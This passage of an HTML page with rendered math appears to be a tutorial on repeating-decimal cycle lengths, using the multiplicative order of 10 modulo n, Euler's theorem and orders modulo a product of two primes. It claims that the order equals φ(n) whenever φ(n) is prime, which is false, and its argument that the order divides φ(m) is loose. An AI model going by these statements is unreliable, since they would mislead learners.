mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">10^k \mod n=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>, it indicates a cycle. However, this may not be the first cycle, as the remainder might have appeared twice at another number, such as 2, hence the cycle would be shorter.</p><p>First, consider when 10 and n are coprime, forming a cyclic group <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">{</mo><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>n</mi><mi mathvariant="normal">∣</mi><mi>k</mi><mo>∈</mo><msup><mi mathvariant="double-struck">N</mi><mo>∗</mo></msup><mo stretchy="false">}</mo></mrow><annotation encoding="application/x-tex">\{10^k \mod n | k \in \mathbb{N^*}\}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0991em;vertical-align:-0.25em;"></span><span class="mopen">{</span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathbb">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6887em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">}</span></span></span></span>, the order of the cyclic group is the smallest number that makes it remainder 1, and it must be a factor of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>. Obviously, if <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> is prime, then the order is <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\varphi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">φ</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>.</p><p>This is because the group is closed, the product of any two group elements is still an element of the group. If we consider all possible powers of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^k \mod m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span></span></span></span>, this set is also closed under modulo m multiplication. Then, if <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> generates a cyclic group, the order of the group (the number of elements in the group) is the smallest positive integer <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span>, such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^k \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>. This order <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> must divide any <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">x</span></span></span></span> for which <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>x</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^x \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> holds, including <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>.</p><p>Since <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^{\phi(m)} \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">m</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> always holds (according to Euler’s theorem), it means that the order of the group must be a factor of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>. Because if there exists some <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo>&lt;</mo><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">k &lt; \phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7335em;vertical-align:-0.0391em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> such that <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.4444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">a^k \equiv 1 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.3333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>, then <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span> must be a multiple of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span></span></span></span> to ensure the group’s cyclic nature and the definition of order.</p><p>In short, the cycle of powers completes at most once upon reaching <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>, but the actual cycle may complete at an earlier point, thus the actual cycle length (the order of the group) is a factor of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">ϕ</span><span class="mopen">(</span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span>.</p><p><strong>Calculating the order</strong> Besides directly starting from 1 and finding the smallest positive integer making <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>m</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">10^k \mod m=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span>, there are simplifications, especially when k is very large.<br>When <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo>=</mo><mi>p</mi><mi>q</mi></mrow><annotation encoding="application/x-tex">m = pq</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">pq</span></span></span></span>, where <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> are different primes, and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span> is coprime with both <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">p</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>q</mi></mrow><annotation encoding="application/x-tex">q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>.</p><p>Suppose the order of the multiplicative group of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^k \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span> is <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>p</mi></msub></mrow><annotation encoding="application/x-tex">n_p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>, and the order of the multiplicative group of <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mi>k</mi></msup><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^k \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span> is <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">n_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>. According to Euler’s theorem, we know <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>p</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi></mrow><annotation encoding="application/x-tex">a^{\phi(p)} \equiv 1 \mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">p</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">p</span></span></span></span> and <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>a</mi><mrow><mi>ϕ</mi><mo stretchy="false">(</mo><mi>q</mi><mo stretchy="false">)</mo></mrow></msup><mo>≡</mo><mn>1</mn><mspace></mspace><mspace width="0.6667em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>q</mi></mrow><annotation encoding="application/x-tex">a^{\phi(q)} \equiv 1 \mod q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.888em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">ϕ</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.6667em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">mod</span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span>, so <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>p</mi></msub><mi mathvariant="normal">∣</mi><mi>ϕ</mi><mo 